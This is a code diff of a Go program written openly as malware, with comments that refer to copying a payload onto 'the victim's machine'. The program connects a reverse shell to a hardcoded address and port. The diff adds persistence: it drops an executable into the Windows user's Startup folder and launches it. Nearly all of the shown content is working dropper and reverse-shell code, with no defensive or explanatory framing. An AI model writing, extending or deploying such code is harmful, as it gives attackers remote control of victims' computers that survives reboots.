@@ -24,21 +24,26 @@ import (
    "time"
    "path/filepath"
    "strings"
+   "os/user"
    "os"
    "io"
-   "fmt"
 )
 
 /* 
 Copy function will attempt to copy the payload into the victim's machine.
 This is the copy function, takes in the source of the payload, and the destination.
 */
-func copy(sourcePath, destPath string){
-    inputFile, _ := os.Open(sourcePath)
-    outputFile, _ := os.Create(destPath)
-    defer outputFile.Close()
-    io.Copy(outputFile, inputFile)
-    inputFile.Close()
+
+func copy(src, dst string) {
+    in, _ := os.Open(src)
+
+    defer in.Close()
+
+    out, _ := os.Create(dst)
+
+    defer out.Close()
+
+    io.Copy(out, in)
 }
 
 /* 
@@ -92,7 +97,10 @@ func main() {
   if checkPayloadInVictim(){
     reverse("192.168.50.39:1234")
   } else {
-    copy("windows_reverse_shell.exe", "C:/temp/a.exe")
-    exec.Command("C:/temp/a.exe")
+    usr, _ := user.Current()
+    target := usr.HomeDir + "\\Start Menu\\Programs\\Startup\\a.exe"
+    copy("a.exe", target)
+    cmd := exec.Command(target)
+    cmd.Start()
   }
 }
